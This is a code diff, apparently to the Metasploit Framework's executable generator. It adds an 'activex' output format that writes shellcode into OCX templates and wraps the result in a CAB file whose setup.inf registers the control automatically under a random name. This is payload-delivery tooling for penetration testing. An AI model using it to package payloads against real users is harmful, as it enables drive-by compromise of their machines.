@@ -16,6 +16,7 @@ require 'rex/pescan'
 require 'rex/zip'
 require 'metasm'
 require 'digest/sha1'
+require 'lcabruby'
 
 	##
 	#
@@ -620,6 +621,70 @@ require 'digest/sha1'
 		pe[mt,8] = Rex::Text.rand_text_alpha(8) if mt
 
 		return pe
+	end
+
+	def self.to_win32pe_ocx(framework, code, opts={})
+		set_template_default(opts, "template_x86_windows.ocx")
+
+		pe = ''
+		File.open(opts[:template], "rb") { |fd|
+			pe = fd.read(fd.stat.size)
+		}
+
+		bo = pe.index('PAYLOAD:')
+		raise RuntimeError, "Invalid Win64 PE OCX template: missing \"PAYLOAD:\" tag" if not bo
+
+		if (code.length <= 2048)
+			pe[bo, code.length] = [code].pack("a*")
+		else
+			raise RuntimeError, "The EXE generator now has a max size of 2048 bytes, please fix the calling module"
+		end
+
+		return pe
+	end
+
+	def self.to_win64pe_ocx(framework, code, opts={})
+		set_template_default(opts, "template_x64_windows.ocx")
+
+		pe = ''
+		File.open(opts[:template], "rb") { |fd|
+			pe = fd.read(fd.stat.size)
+		}
+
+		bo = pe.index('PAYLOAD:')
+		raise RuntimeError, "Invalid Win64 PE OCX template: missing \"PAYLOAD:\" tag" if not bo
+
+		if (code.length <= 2048)
+			pe[bo, code.length] = [code].pack("a*")
+		else
+			raise RuntimeError, "The EXE generator now has a max size of 2048 bytes, please fix the calling module"
+		end
+
+		return pe
+	end
+
+	def self.to_activex_cab(ocx)
+		cab_file = Lcab::CabFile.new
+		cab_file.strip_path = true
+		ocx_name = Rex::Text.rand_text_alpha(rand(5)+8) << '.ocx'
+
+		setup_inf = %Q|
+[version]
+	signature="$CHICAGO$"
+	AdvancedINF=2.0
+[Add.Code]
+	#{ocx_name}=#{ocx_name}
+[#{ocx_name}]
+	file-win32-x86=thiscab
+	clsid={56C04F88-9E36-434B-82A3-D552B81A8CB9}
+	FileVersion=1,0,0,1
+	RegisterServer=yes
+|
+		files = []
+		files << { :filename => ocx_name, :data => ocx }
+		files << { :filename => 'setup.inf', :data => setup_inf }
+		cab_file.datafile_list = files
+		return cab_file.get_cab_string, ocx_name
 	end
 
 	def self.to_osx_arm_macho(framework, code, opts={})
@@ -1674,7 +1739,15 @@ def self.to_vba(framework,code,opts={})
 				when ARCH_X86,nil then to_win32pe_dll(framework, code, exeopts)
 				when ARCH_X86_64  then to_win64pe_dll(framework, code, exeopts)
 				when ARCH_X64     then to_win64pe_dll(framework, code, exeopts)
-				end
+			         end
+		when 'activex'
+			ocx = case arch
+				         when ARCH_X86,nil then to_win32pe_ocx(framework, code, exeopts)
+				         when ARCH_X86_64  then to_win64pe_ocx(framework, code, exeopts)
+				         when ARCH_X64     then to_win64pe_ocx(framework, code, exeopts)
+			         end
+
+			output, discarded = to_activex_cab(ocx)
 		when 'exe'
 			output = case arch
 				when ARCH_X86,nil then to_win32pe(framework, code, exeopts)
@@ -1766,7 +1839,7 @@ def self.to_vba(framework,code,opts={})
 	def self.to_executable_fmt_formats
 		[
 			'dll','exe','exe-service','exe-small','exe-only','elf','macho','vba','vba-exe',
-			'vbs','loop-vbs','asp','aspx','war','psh','psh-net'
+			'vbs','loop-vbs','asp','aspx','war','psh','psh-net','activex'
 		]
 	end
 
